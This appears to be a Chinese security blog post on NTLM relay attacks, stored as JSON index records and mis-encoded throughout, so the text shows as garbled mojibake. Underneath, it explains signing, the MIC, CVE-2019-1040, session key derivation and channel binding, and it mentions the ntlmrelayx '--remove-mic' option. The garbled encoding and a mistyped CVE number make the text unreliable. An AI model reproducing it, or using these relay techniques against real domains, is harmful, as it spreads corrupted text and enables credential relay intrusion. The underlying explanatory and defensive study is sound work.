æœåŠ¡å™¨å¿…é¡»ä¸éœ€è¦æ•°æ®åŒ…ç­¾åï¼Œé»˜è®¤æƒ…å†µä¸‹æ‰€æœ‰æœºå™¨éƒ½æ˜¯è¿™ç§æƒ…å†µ å®¢æˆ·ç«¯ä¸å¾—å°† NEGOTIATE_SIGN æ ‡å¿—è®¾ç½®ä¸º 1ã€‚å¦‚æœä»–è¿™æ ·åšäº†ï¼Œé‚£ä¹ˆæœåŠ¡å™¨å°†éœ€è¦ç­¾åï¼Œå¹¶ä¸”ç”±äºæˆ‘ä»¬ä¸çŸ¥é“ç”¨æˆ·çš„å¯†é’¥ï¼Œå°±æ— æ³•å¯¹ä¼ªé€ çš„ LDAP æ•°æ®åŒ…è¿›è¡Œç­¾åã€‚ å…³äºè¦æ±‚ 2ï¼Œæœ‰æ—¶å®¢æˆ·ç«¯ä¸è®¾ç½®æ­¤æ ‡å¿—ï¼Œä½†æ˜¯ï¼ŒWindows SMB å®¢æˆ·ç«¯è®¾ç½®äº†è¯¥å‚æ•°ï¼Œé»˜è®¤æƒ…å†µä¸‹ï¼Œæ— æ³•å°† SMB èº«ä»½éªŒè¯ä¸­ç»§åˆ° LDAPã€‚ é‚£ä¹ˆä¸ºä»€ä¹ˆä¸ç›´æ¥æ›´æ”¹ NEGOTIATE_FLAG æ ‡å¿—å¹¶å°†å…¶è®¾ç½®ä¸º 0ï¼Ÿè¿™å°±æ˜¯æˆ‘ä»¬å°†åœ¨ä¸‹ä¸€èŠ‚ä¸­è¦é˜è¿°çš„å†…å®¹ã€‚ ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:5:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"6 è®¤è¯ç­¾å(MIC) ä¸Šæ–‡ä¸­ä»¥ SMBã€LDAP ä¸¤ä¸ªåè®®ä¸ºä¾‹ï¼Œé˜è¿°äº†å¦‚ä½•ä¿æŠ¤ä¼šè¯å…å—ä¸­é—´äººæ”»å‡»ã€‚ä¸ºäº†è¿›ä¸€æ­¥é˜è¿° MIC çš„ä½œç”¨ï¼Œå†ä¸¾ä¸€ä¸ªå…·ä½“çš„æ¡ˆä¾‹ã€‚ ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:6:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"6.1 ç»å…¸æ¡ˆä¾‹ å‡è®¾æ”»å‡»è€…è®¾æ³•å°†è‡ªå·±ç½®äºä¸­é—´äººä½ç½®ï¼Œå¹¶ä¸”é€šè¿‡ SMB æ¥æ”¶èº«ä»½éªŒè¯è¯·æ±‚ã€‚çŸ¥é“åŸŸæ§åˆ¶å™¨éœ€è¦ SMB ç­¾åï¼Œæ”»å‡»è€…ä¸å¯èƒ½é€šè¿‡ SMB ä¸­ç»§è¿›è¡Œæ”»å‡»ã€‚å¦ä¸€æ–¹é¢ï¼Œæ­£å¦‚å‰æ–‡æ‰€è¿°ï¼Œç”±äºèº«ä»½éªŒè¯å’Œä¼šè¯ç›¸äº’ç‹¬ç«‹ï¼Œå› æ­¤ä¸­ç»§æ”»å‡»æ—¶å¯ä»¥æ›´æ”¹åè®®çš„ï¼Œå¹¶ä¸”æ”»å‡»è€…å†³å®šä¸­ç»§åˆ° LDAPS åè®®ã€‚ åœ¨èº«ä»½éªŒè¯æ•°æ®ä¸­å­˜åœ¨ NEGOTIATE_SIGN æ ‡å¿—ï¼Œè¯¥æ ‡å¿—ä»…ç”¨äºæŒ‡ç¤ºå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨æ˜¯å¦æ”¯æŒç­¾åã€‚ä½†åœ¨æŸäº›æƒ…å†µä¸‹ï¼Œè¿™ä¸ªæ ‡å¿—ä¼šè¢«è€ƒè™‘åœ¨å†…ï¼Œå¦‚ä¸Šæ–‡ä¸­æè¿°çš„ LDAP åè®®é‚£æ ·ã€‚ å¯¹äº LDAPSï¼ŒæœåŠ¡å™¨ä¹Ÿä¼šåŒæ ·ä½¿ç”¨æ­¤æ ‡å¿—ä½ã€‚LDAPS æ˜¯åŸºäº TLS çš„ LDAPï¼ŒTLS è´Ÿè´£å¤„ç†æ•°æ®åŒ…ç­¾åï¼ˆå’ŒåŠ å¯†ï¼‰çš„ã€‚å› æ­¤ï¼Œå¦‚æœæœåŠ¡å™¨æ”¶åˆ° NEGOTIATE_SIGN æ ‡å¿—è®¾ç½®ä¸º 1 çš„èº«ä»½éªŒè¯è¯·æ±‚ï¼ŒLDAPS å®¢æˆ·ç«¯æ²¡æœ‰ç†ç”±è¡¨æ˜å®ƒå¯ä»¥ç­¾åæ•°æ®åŒ…ï¼Œå› æ­¤ï¼ŒæœåŠ¡ç«¯å°†æ‹’ç»èº«ä»½éªŒè¯ã€‚ åœ¨ä¸Šé¢è®¾æƒ³çš„æ”»å‡»æµç¨‹ä¸­ï¼Œå®¢æˆ·ç«¯æƒ³è¦é€šè¿‡ SMB è¿›è¡Œèº«ä»½éªŒè¯ï¼Œå®ƒæ”¯æŒæ•°æ®åŒ…ç­¾åï¼Œå¹¶å°† NEGOTIATE_SIGN æ ‡å¿—è®¾ç½®ä¸º 1ã€‚ä½†æ˜¯å¦‚æœæˆ‘ä»¬ä¸­ç»§å…¶èº«ä»½éªŒè¯ï¼Œè€Œæ— éœ€æ›´æ”¹ä»»ä½•å†…å®¹ï¼Œé€šè¿‡ LDAPSï¼Œç„¶å LDAPS æœåŠ¡å™¨å°†çœ‹åˆ°æ­¤æ ‡å¿—ï¼Œå¹¶ä¼šç»ˆæ­¢èº«ä»½éªŒè¯ã€‚ å¯ä»¥ç®€å•åœ°ä¿®æ”¹ NTLM æ¶ˆæ¯å¹¶åˆ é™¤æ ‡å¿—ä¹ˆï¼Ÿå¦‚æœå¯ä»¥ï¼Œä¸Šé¢çš„æ”»å‡»åœºæ™¯å°±æˆç«‹ã€‚ä½†æ˜¯ï¼Œé™¤äº†åœ¨ NTLM çº§åˆ«çš„ç­¾åå¤–ï¼Œè¿˜æœ‰å¦ä¸€ä¸ªç­¾åã€‚è¯¥ç­¾åç§°ä¸º MICï¼Œæˆ–æ¶ˆæ¯å®Œæ•´æ€§ä»£ç ã€‚ ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:6:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"6.2 MIC - Message Integrity Code MIC æ˜¯ä»…åœ¨ NTLM èº«ä»½éªŒè¯çš„æœ€åä¸€æ¡æ¶ˆæ¯ AUTHENTICATE æ¶ˆæ¯ä¸­å‘é€çš„ç­¾åã€‚è¯¥ç­¾ååœ¨è®¡ç®—æ—¶ä¼šåŒ…å« NTLM è®¤è¯çš„ 3 æ¡æ¶ˆæ¯ã€‚ MIC ä½¿ç”¨ HMAC_MD5 å‡½æ•°è®¡ç®—ï¼Œå¯†é’¥ä¸ºåŸºäºç”¨æˆ·å¯†é’¥ç”Ÿæˆçš„å¯†é’¥ï¼Œç§°ä¸ºä¼šè¯å¯†é’¥(Session Key)ã€‚ HMAC_MD5(Session key, NEGOTIATE_MESSAGE + CHALLENGE_MESSAGE + AUTHENTICATE_MESSAGE) é‡è¦çš„æ˜¯ä¼šè¯å¯†é’¥å–å†³äºç”¨æˆ·çš„å¯†é’¥ï¼Œå› æ­¤æ”»å‡»è€…æ— æ³•é‡æ–°è®¡ç®— MICã€‚ ä¸‹å›¾ä¸º MIC çš„æ ·ä¾‹ï¼š å› æ­¤ï¼Œå¦‚æœ 3 ä¸ªæ¶ˆæ¯ä¸­åªè¦æœ‰ä¸€ä¸ªè¢«ä¿®æ”¹ï¼Œåˆ™ MIC å°†ä¸å†æœ‰æ•ˆã€‚æ‰€ä»¥ä¸èƒ½åƒç›´æ¥æ›´æ”¹ NEGOTIATE_SIGN æ ‡å¿—ã€‚ ç”±äºMIC æ˜¯å¯é€‰çš„ï¼Œå¦‚æœåªæ˜¯ç§»é™¤ MIC å‘¢ï¼Ÿä½†æ˜¯ï¼Œè¿™æ ·åšå¹¶ä¸ä¼šæœ‰æ•ˆæœã€‚å› ä¸ºè¿˜æœ‰å¦ä¸€ä¸ªæ ‡å¿—ä½è¡¨æ˜ MIC å°†å‡ºç°ï¼Œå³ msAvFlagsã€‚ å®ƒä¹Ÿå­˜åœ¨äº NTLM å“åº”ä¸­ï¼Œå¦‚æœå®ƒæ˜¯ 0x00000002ï¼Œåˆ™å‘æœåŠ¡å™¨è¡¨åå¿…é¡»å­˜åœ¨ MICã€‚å› æ­¤ï¼Œå¦‚æœæœåŠ¡å™¨æ²¡æœ‰çœ‹åˆ° MICï¼Œå®ƒå°±ä¼šç»ˆæ­¢èº«ä»½éªŒè¯ã€‚ å¦‚æœå°† msAcFlags è®¾ç½®ä¸º 0ï¼Œç„¶åå†ç§»é™¤ MIC å‘¢ï¼Ÿ äº‹å®è¯æ˜ï¼ŒNTLMv2 Hashï¼Œå³å®¢æˆ·ç«¯å¯¹ Challenge çš„å“åº”ï¼Œå®ƒä¸ä»…è€ƒè™‘äº† Challengeï¼Œè€Œä¸”è¿˜è€ƒè™‘äº†å“åº”çš„æ‰€æœ‰æ ‡å¿—ã€‚è¡¨ç¤º MIC å­˜åœ¨çš„æ ‡å¿—æ˜¯æ­¤å“åº”çš„ä¸€éƒ¨åˆ†ã€‚ æ›´æ”¹æˆ–åˆ é™¤æ­¤æ ‡å¿—å°†ä½¿ NTLMv2 Hash å¤±æ•ˆï¼Œå› ä¸ºæ•°æ®å°†è¢«ä¿®æ”¹ã€‚ MIC ä¿æŠ¤ 3 æ¡æ¶ˆæ¯çš„å®Œæ•´æ€§ï¼ŒmsAvFlags ä¿æŠ¤ MIC çš„å­˜åœ¨ï¼ŒNTLMv2 å“ˆå¸Œä¿æŠ¤æ ‡å¿—çš„å­˜åœ¨ã€‚æ”»å‡»è€…ä¸çŸ¥é“ç”¨æˆ·çš„å¯†é’¥ï¼Œä¹Ÿæ— æ³•é‡æ–°è®¡ç®—è¿™ä¸ªå“ˆå¸Œã€‚ ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:6:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"6.3 Drop the MIC CVE-2019-1040ï¼šDrop the MIC æ¼æ´ã€‚è¯¥æ¼æ´æŒ‡å‡ºï¼šå¦‚æœç›´æ¥ç§»é™¤ MICï¼Œå³ä½¿è¯¥æ ‡å¿—è¡¨æ˜å…¶å­˜åœ¨ï¼ŒæœåŠ¡å™¨ä¹Ÿä¼šæ¥å—èº«ä»½éªŒè¯ã€‚ å¯ä»¥ä½¿ç”¨ ntlmrelayx å·¥å…·ä¸­çš„ --remove-mic å‚æ•°æ¥åˆ é™¤ MICã€‚ ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:6:3","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"7 Session Key åœ¨å‰æ–‡é˜è¿°äº†ä¼šè¯ç­¾åå’Œèº«ä»½è®¤è¯ç­¾åï¼ŒæåŠåˆ°è¦ç­¾åæ—¶éœ€è¦è·å¾—ç”¨æˆ·çš„å¯†é’¥ã€‚åœ¨å…³äº MIC çš„å°èŠ‚ä¸­ä¹Ÿæåˆ°è¿‡ï¼Œå®é™…ä¸Šä½¿ç”¨çš„å¹¶ä¸å®Œå…¨æ˜¯ç”¨æˆ·çš„å¯†é’¥ï¼Œè€Œæ˜¯ Session Keyï¼Œå®ƒåŸºäºç”¨æˆ·å¯†é’¥ç”Ÿæˆã€‚ ä»¥ä¸‹æ˜¯ä¸º NTLMv1 å’Œ NTLMv2 è®¡ç®— Session Key çš„æ–¹æ³•ï¼š # For NTLMv1 Key = MD4(NT Hash) # For NTLMv2 NTLMv2 Hash = HMAC_MD5(NT Hash, Uppercase(Username) + UserDomain) Key = HMAC_MD5(NTLMv2 Hash, HMAC_MD5(NTLMv2 Hash, NTLMv2 Response + Challenge)) æœ‰äº†è¿™äº›ç®—æ³•ï¼Œå®¢æˆ·ç«¯å¯ä»¥å®Œæˆ Session Key çš„è®¡ç®—ã€‚ä½†æ˜¯ï¼Œåœ¨åŸŸç¯å¢ƒä¸­ï¼ŒæœåŠ¡å™¨ç”±äºæ²¡æœ‰ç”¨æˆ·å¯†é’¥ä¸èƒ½ç‹¬ç«‹å®Œæˆã€‚å¯¹äºæœ¬åœ°èº«ä»½éªŒè¯ï¼Œæ˜¯æ²¡æœ‰é—®é¢˜çš„ã€‚ å› æ­¤ï¼Œå¯¹äºåŸŸå¸æˆ·çš„èº«ä»½éªŒè¯ï¼ŒæœåŠ¡å™¨ä¼šè®©åŸŸæ§åˆ¶å™¨ä¸ºå®ƒè®¡ç®— Session Keyï¼Œç„¶åå°†å…¶è¿”å›ã€‚æœåŠ¡å™¨ä»¥ NETLOGON_NETWORK_INFO ç»“æ„å‘åŸŸæ§åˆ¶å™¨å‘é€è¯·æ±‚ï¼ŒåŸŸæ§åˆ¶å™¨ä»¥ NETLOGON_VALIDATION_SAM_INFO4 ç»“æ„å“åº”ã€‚å¦‚æœèº«ä»½éªŒè¯æˆåŠŸï¼Œä¼šè¯å¯†é’¥å°†åœ¨åŸŸæ§åˆ¶å™¨çš„æ­¤å“åº”ä¸­å‘é€ã€‚ é‚£ä¹ˆé—®é¢˜å°±å‡ºç°äº†ï¼Œå¦‚æœæ”»å‡»è€…æ„é€ å‡ºä¸ç›®æ ‡æœåŠ¡å™¨å‘åŸŸæ§åˆ¶å™¨å‘å‡ºçš„ç›¸åŒè¯·æ±‚ï¼Œå°±åŒæ ·å¯ä»¥è·å¾— Session Keyï¼Œå³ï¼šCVE-2015-005 ã€‚ åŸŸæ§åˆ¶å™¨æ²¡æœ‰éªŒè¯æ­£åœ¨å‘é€çš„èº«ä»½éªŒè¯ä¿¡æ¯æ˜¯å¦å®é™…ä¸Šæ˜¯é’ˆå¯¹è¯·æ±‚æ­¤æ“ä½œçš„åŠ å…¥åŸŸçš„æœºå™¨ï¼ˆä¾‹å¦‚ NetrLogonSamLogonWithFlags()ï¼‰ã€‚è¿™æ„å‘³ç€ä»»ä½•åŠ å…¥åŸŸçš„æœºå™¨éƒ½å¯ä»¥éªŒè¯é’ˆå¯¹åŸŸæ§åˆ¶å™¨çš„ä»»ä½•ä¼ é€’èº«ä»½éªŒè¯ï¼Œå¹¶è·å–åŸŸå†…ä»»ä½•ä¼šè¯çš„ Session Keyã€‚ æ‰€ä»¥ï¼Œå¾®è½¯å·²ç»ä¿®å¤äº†è¿™ä¸ª BUGã€‚ä¸ºäº†éªŒè¯åªæœ‰ç”¨æˆ·è¿›è¡Œèº«ä»½éªŒè¯çš„æœåŠ¡å™¨æœ‰æƒè¯·æ±‚ä¼šè¯å¯†é’¥ï¼ŒåŸŸæ§åˆ¶å™¨å°†éªŒè¯ AUTHENTICATE å“åº”ä¸­çš„ç›®æ ‡è®¡ç®—æœºä¸å‘å‡º NetLogon è¯·æ±‚çš„ä¸»æœºç›¸åŒã€‚ åœ¨ AUTHENTICATE å“åº”ä¸­ï¼Œæˆ‘ä»¬è¯¦ç»†è¯´æ˜äº† msAvFlags çš„å­˜åœ¨æ˜¯ä¸ºäº†è¡¨æ˜ MIC æ˜¯å¦å­˜åœ¨ã€‚ä½†è¿˜æœ‰å…¶å®ƒä¿¡æ¯ï¼Œä¾‹å¦‚ç›®æ ‡æœºå™¨çš„ Netbios åç§°ã€‚ è¿™æ˜¯ä¸å‘å‡º NetLogon è¯·æ±‚çš„ä¸»æœºè¿›è¡Œæ¯”è¾ƒçš„æœºå™¨åç§°ã€‚å› æ­¤ï¼Œå¦‚æœæ”»å‡»è€…å°è¯•å¯¹ DC è¿›è¡Œ NetLogon è¯·æ±‚ï¼Œç”±äºæ”»å‡»è€…çš„åç§°ä¸ NTLM å“åº”ä¸­çš„ç›®æ ‡ä¸»æœºåä¸åŒ¹é…ï¼ŒåŸŸæ§åˆ¶å™¨å°†æ‹’ç»è¯¥è¯·æ±‚ã€‚ æœ€åï¼Œä¸ msAvFlags ä¸€æ ·ï¼Œåœ¨è®¡ç®— NTLMv2 Hash æ—¶ï¼ŒåŒ…å«äº†æœºå™¨åç§°ï¼Œå› æ­¤ï¼Œä¸èƒ½åœ¨ NTLM å“åº”ä¸­ä¿®æ”¹æœºå™¨åç§°ã€‚ ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:7:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"8 Channel Binding æœ¬èŠ‚å°†è®¨è®ºæœ€åä¸€ä¸ªæ¦‚å¿µã€‚æœ¬æ–‡åå¤æåˆ°è¿‡ï¼Œèº«ä»½éªŒè¯å±‚ï¼Œå³ NTLM æ¶ˆæ¯ï¼Œå‡ ä¹ç‹¬ç«‹äºåº”ç”¨å±‚ä½¿ç”¨çš„åè®®ï¼ˆSMBã€LDAP ç­‰ï¼‰ã€‚ è¯´ã€Œå‡ ä¹ã€æ˜¯å› ä¸ºå·²ç»çœ‹åˆ°ä¸€äº›åè®®ä½¿ç”¨ NTLM æ¶ˆæ¯æ ‡å¿—æ¥è¡¨æ˜ä¼šè¯æ˜¯å¦å¿…é¡»ç­¾åã€‚ åœ¨ä»»ä½•æƒ…å†µä¸‹ï¼Œå°±ç›®å‰è€Œè¨€ï¼Œæ”»å‡»è€…å¾ˆæœ‰å¯èƒ½ä»åè®® A ä¸­æ£€ç´¢ NTLM æ¶ˆæ¯ï¼Œç„¶åä½¿ç”¨åè®® B å°†å…¶å‘å›ï¼Œç§°ä¸ºè·¨åè®®ä¸­ç»§ã€‚ å› æ­¤ï¼Œå­˜åœ¨ä¸€ç§æ–°çš„ä¿æŠ¤æªæ–½æ¥å¯¹æŠ—è¿™ç§æ”»å‡»ã€‚è¿™ç§°ä¸ºé€šé“ç»‘å®š(Channel Binding)ï¼Œæˆ– EPAï¼ˆå¢å¼ºå‹èº«ä»½éªŒè¯ä¿æŠ¤ï¼‰ã€‚è¿™ç§ä¿æŠ¤çš„åŸåˆ™æ˜¯å°†èº«ä»½éªŒè¯å±‚ä¸ä½¿ç”¨ä¸­çš„åè®®ç»‘å®šï¼Œå³ä½¿å­˜åœ¨ TLS å±‚ï¼ˆä¾‹å¦‚ LDAPS æˆ– HTTPSï¼‰ã€‚æ€»ä½“æ€è·¯æ˜¯ï¼Œåœ¨æœ€åä¸€æ¡ NTLM AUTHENTICATE æ¶ˆæ¯ä¸­ï¼Œæœ‰ä¸€æ¡ä¿¡æ¯æ”¾åœ¨é‚£é‡Œï¼Œæ”»å‡»è€…æ— æ³•ä¿®æ”¹ã€‚æ­¤ä¿¡æ¯æŒ‡ç¤ºæ‰€éœ€çš„æœåŠ¡ï¼Œä»¥åŠå¯èƒ½åŒ…å«ç›®æ ‡æœåŠ¡å™¨è¯ä¹¦å“ˆå¸Œçš„å¦ä¸€ä¸ªä¿¡æ¯ã€‚ ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:8:0","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"8.1 Service binding ç¬¬ä¸€ç±»ä¿æŠ¤æ–¹æ³•å¾ˆå®¹æ˜“ç†è§£ã€‚å¦‚æœå®¢æˆ·ç«¯å¸Œæœ›å¯¹æœåŠ¡å™¨è¿›è¡Œèº«ä»½éªŒè¯ä»¥ä½¿ç”¨ç‰¹å®šæœåŠ¡ï¼Œåˆ™ä¼šåœ¨ NTLM å“åº”ä¸­æ·»åŠ æ ‡è¯†è¯¥æœåŠ¡çš„ä¿¡æ¯ã€‚ è¿™æ ·ï¼Œå½“æœåŠ¡å™¨æ”¶åˆ°è¿™ä¸ªè®¤è¯åï¼Œå°±å¯ä»¥çœ‹åˆ°å®¢æˆ·ç«¯è¯·æ±‚çš„æœåŠ¡ï¼Œå¦‚æœä¸å®é™…è¯·æ±‚çš„ä¸ä¸€æ ·ï¼Œå°±ä¸ä¼šåŒæ„æä¾›è¯¥æœåŠ¡ã€‚ ç”±äºæœåŠ¡åç§°åœ¨ NTLM å“åº”ä¸­ï¼Œå› æ­¤å®ƒå—åˆ° NtProofStr å“åº”çš„ä¿æŠ¤ï¼Œè¯¥å“åº”æ˜¯æ­¤ä¿¡æ¯ã€è´¨è¯¢å’Œå…¶ä»–ä¿¡æ¯ï¼ˆä¾‹å¦‚ msAvFlagsï¼‰çš„ HMAC_MD5ã€‚å®ƒæ˜¯ç”¨å®¢æˆ·ç«¯çš„å¯†é’¥è®¡ç®—çš„ã€‚ åœ¨ä¸Šå›¾çš„ç¤ºä¾‹ä¸­ï¼Œå®¢æˆ·ç«¯å°è¯•é€šè¿‡ HTTP å‘æœåŠ¡å™¨éªŒè¯è‡ªå·±çš„èº«ä»½ã€‚é™¤äº†æœåŠ¡å™¨æ˜¯æ”»å‡»è€…ï¼Œå¹¶ä¸”æ”»å‡»è€…å°†æ­¤èº«ä»½éªŒè¯é‡æ”¾åˆ°æœåŠ¡å™¨ï¼Œä»¥è®¿é—®ç½‘ç»œå…±äº« (SMB)ã€‚ é™¤äº†å®¢æˆ·ç«¯åœ¨ä»–çš„ NTLM å“åº”ä¸­æŒ‡æ˜äº†ä»–æƒ³è¦ä½¿ç”¨çš„æœåŠ¡ï¼Œå¹¶ä¸”ç”±äºæ”»å‡»è€…æ— æ³•ä¿®æ”¹æœåŠ¡ä¿¡æ¯ï¼Œæ”»å‡»è€…åªèƒ½æŒ‰åŸæ ·é‡æ”¾å®ƒã€‚æœåŠ¡å™¨ç„¶åæ¥æ”¶åˆ°æœ€åä¸€æ¡æ¶ˆæ¯ï¼Œå°†æ”»å‡»è€…ï¼ˆSMBï¼‰è¯·æ±‚çš„æœåŠ¡ä¸NTLMæ¶ˆæ¯ï¼ˆHTTPï¼‰ä¸­æŒ‡å®šçš„æœåŠ¡è¿›è¡Œæ¯”è¾ƒï¼Œæ‹’ç»è¿æ¥ï¼Œå‘ç°ä¸¤ä¸ªæœåŠ¡ä¸åŒ¹é…ã€‚ å…·ä½“æ¥è¯´ï¼Œæ‰€è°“çš„æœåŠ¡å…¶å®å°±æ˜¯ SPN (Service Principal Name)ã€‚ä¸‹å›¾æ˜¯å®¢æˆ·ç«¯åœ¨å…¶ NTLM å“åº”ä¸­å‘é€ SPN çš„æ•°æ®åŒ…ã€‚ å¯ä»¥çœ‹åˆ°å®ƒè¡¨ç¤ºå®¢æˆ·ç«¯å°†ä½¿ç”¨ CIFS æœåŠ¡ã€‚å°†æ­¤ä¿¡æ¯ä¸­ç»§åˆ° LDAP æœåŠ¡å™¨å°†å¯¼è‡´æœåŠ¡å™¨æ‹’ç»è®¿é—®ã€‚ åŒæ—¶ï¼Œè¯¥å±æ€§ä¸ä»…æœ‰æœåŠ¡åç§° (CIFS)ï¼Œè¿˜æœ‰ç›®æ ‡åç§°æˆ– IP åœ°å€ã€‚ è¿™æ„å‘³ç€å¦‚æœæ”»å‡»è€…å°†æ­¤æ¶ˆæ¯ä¸­ç»§åˆ°æœåŠ¡å™¨ï¼ŒæœåŠ¡å™¨ä¹Ÿä¼šæ£€æŸ¥ IP ç­‰å­—ç¬¦ä¸²ï¼Œä¸ä¸€è‡´ä¼šæ‹’ç»è¿æ¥ã€‚ ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:8:1","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM Relay","uri":"/2021/09/ntlm-relay/"},{"categories":["å†…ç½‘æ¸—é€"],"content":"8.2 TLS binding TLS binging æ­¤ä¿æŠ¤çš„ç›®çš„æ˜¯å°†èº«ä»½éªŒè¯å±‚ï¼ˆå³ NTLM æ¶ˆæ¯ï¼‰é“¾æ¥åˆ°å¯èƒ½ä½¿ç”¨çš„ TLS å±‚ã€‚ å¦‚æœå®¢æˆ·ç«¯æƒ³è¦ä½¿ç”¨å°è£…åœ¨ TLS ä¸­çš„åè®®ï¼ˆä¾‹å¦‚ HTTPSã€LDAPSï¼‰ï¼Œå®ƒå°†ä¸æœåŠ¡å™¨å»ºç«‹ TLS ä¼šè¯ï¼Œå¹¶è®¡ç®—æœåŠ¡å™¨è¯ä¹¦å“ˆå¸Œã€‚æ­¤å“ˆå¸Œç§°ä¸ºé€šé“ç»‘å®šä»¤ç‰Œ (CBT)ã€‚ è®¡ç®—å®Œæˆåï¼Œå®¢æˆ·ç«¯ä¼šå°†è¿™ä¸ªå“ˆå¸Œå€¼æ”¾å…¥å…¶ NTLM å“åº”ä¸­ã€‚ ç„¶åï¼ŒæœåŠ¡å™¨å°†åœ¨èº«ä»½éªŒè¯ç»“æŸæ—¶æ¥æ”¶ NTLM æ¶ˆæ¯ï¼Œè¯»å–æä¾›çš„å“ˆå¸Œå€¼ï¼Œå¹¶å°†å…¶ä¸å…¶è¯ä¹¦çš„çœŸå®å“ˆå¸Œå€¼è¿›è¡Œæ¯”è¾ƒã€‚ å¦‚æœä¸åŒï¼Œåˆ™è¡¨ç¤ºä¸æ˜¯ NTLM ä¿¡æ¯çš„åŸå§‹æ¥æ”¶è€…ã€‚ åŒæ ·ï¼Œç”±äºæ­¤æ•£åˆ—åœ¨ NTLM å“åº”ä¸­ï¼Œå› æ­¤å®ƒå— NtProofStr å“åº”çš„ä¿æŠ¤ï¼Œå°±åƒæœåŠ¡ç»‘å®šçš„ SPN ä¸€æ ·ã€‚ ç”±äºå­˜åœ¨è¿™ç§ç±»å‹çš„ä¿æŠ¤ï¼Œä»¥ä¸‹ä¸¤ç§æ”»å‡»åœºæ™¯å°±ä¸å¯èƒ½å†å‘ç”Ÿï¼š å¦‚æœæ”»å‡»è€…æƒ³ä»ä½¿ç”¨ä¸å¸¦ TLS å±‚çš„åè®®çš„å®¢æˆ·ç«¯ä¸­ç»§åˆ°å¸¦ TLS å±‚çš„åè®®ï¼ˆä¾‹å¦‚ HTTP åˆ° LDAPSï¼‰ï¼Œåˆ™æ”»å‡»è€…ç”±äºä¸èƒ½æ›´æ–° NtProofStrï¼Œå¯¼è‡´æ— æ³•å°†æ¥è‡ªç›®æ ‡æœåŠ¡å™¨çš„è¯ä¹¦å“ˆå¸Œæ·»åŠ åˆ° NTLM å“åº”ã€‚ å¦‚æœæ”»å‡»è€…æƒ³ä»ä¸€ä¸ªå¸¦æœ‰ TLS çš„åè®®ä¸­ç»§åˆ°å¦ä¸€ä¸ªå¸¦æœ‰ TLS çš„åè®®ï¼ˆä¾‹å¦‚ HTTPS åˆ° LDAPSï¼‰ï¼Œåœ¨å®¢æˆ·ç«¯å’Œæ”»å‡»è€…ä¹‹é—´å»ºç«‹ TLS ä¼šè¯æ—¶ï¼Œæ”»å‡»è€…å°†æ— æ³•æä¾›æœåŠ¡å™¨è¯ä¹¦ï¼Œå› ä¸ºå®ƒä¸åŒ¹é…æ”»å‡»è€…çš„èº«ä»½ã€‚å› æ­¤ï¼Œå®ƒå¿…é¡»æä¾›ä¼ªé€ çš„è‡ªç­¾è¯ä¹¦ï¼Œä»¥è¯†åˆ«æ”»å‡»è€…ã€‚å®¢æˆ·ç«¯ç„¶åä¼šæ•£åˆ—è¿™ä¸ªè¯ä¹¦ï¼Œå½“æ”»å‡»è€…å°† NTLM å“åº”ä¸­ç»§åˆ°åˆæ³•æœåŠ¡å™¨æ—¶ï¼Œå“åº”ä¸­çš„è¯ä¹¦ Hash ä¸çœŸå®è¯ä¹¦çš„ Hash ä¸åŒï¼ŒæœåŠ¡å™¨å°†æ‹’ç»èº«ä»½éªŒè¯ã€‚ ä¸‹é¢æ˜¯è¯´æ˜è¯¥ç§æ–¹å¼çš„ç¤ºæ„å›¾ã€‚ å›¾ä¸­ä½“ç°äº†ä¸¤ä¸ª TLS ä¼šè¯çš„å»ºç«‹ã€‚ä¸€ç§ä»‹äºå®¢æˆ·ç«¯å’Œæ”»å‡»è€…ä¹‹é—´ï¼ˆçº¢è‰²ï¼‰ï¼Œä¸€ç§ä»‹äºæ”»å‡»è€…å’ŒæœåŠ¡å™¨ä¹‹é—´ï¼ˆè“è‰²ï¼‰ã€‚å®¢æˆ·ç«¯å°†æ¥æ”¶æ”»å‡»è€…çš„è¯ä¹¦ï¼Œå¹¶è®¡ç®—ä¸€ä¸ªå“ˆå¸Œå€¼ï¼Œå³çº¢è‰²çš„è¯ä¹¦å“ˆå¸Œå€¼ã€‚ åœ¨ NTLM äº¤æ¢ç»“æŸæ—¶ï¼Œæ­¤æ•£åˆ—å°†æ·»åŠ åˆ° NTLM å“åº”ä¸­ï¼Œå¹¶ä¸”å°†å—åˆ°ä¿æŠ¤ã€‚æœåŠ¡å™¨æ”¶åˆ°è¿™ä¸ª hashåï¼Œä¼š hash è‡ªå·±çš„è¯ä¹¦ï¼Œç»“æœä¸ä¸€æ ·ï¼Œæ‹’ç»è¿æ¥ã€‚ ","date":"2021-09-24","objectID":"/2021/09/ntlm-relay/:8:2","tags":["åŸŸå®‰å…¨","å†…ç½‘æ¸—é€","NTLM"],"title":"NTLM 